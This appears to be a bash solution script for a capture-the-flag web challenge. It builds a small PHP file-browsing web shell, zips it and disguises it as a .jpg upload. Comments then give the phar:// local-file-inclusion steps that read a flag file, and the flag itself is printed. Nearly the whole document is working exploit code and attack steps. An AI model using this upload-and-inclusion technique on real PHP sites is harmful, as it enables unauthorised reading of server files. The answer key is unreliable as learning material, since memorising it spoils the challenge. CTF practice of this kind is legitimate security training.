#!/bin/bash
echo -e "<?php
\$ls = scandir('./');
foreach (\$ls as \$f)
{
	echo \$f.'<br/>';
}

if(isset(\$_GET['f']) && \$_GET['f'])
{
	show_source(\$_GET['f']);
}
?>" > a.php
zip a.zip a.php
mv a.zip a.zip.jpg
rm a.php
echo 'lf1-Wr4pp3r_Ph4R_pwn3d'
# Once the a.zip.jpg is created:
# upload a.zip.jpg on the challenge page.
# get the id parameter of the file
# request page=phar://tmp/upload/file_id.jpg/a
# the content of the current directory is listed, one file is flag-....php, which contains the flag
# append f=flag-....php as a GET parameter to display flag-....php source code
# the flag is lf1-Wr4pp3r_Ph4R_pwn3d
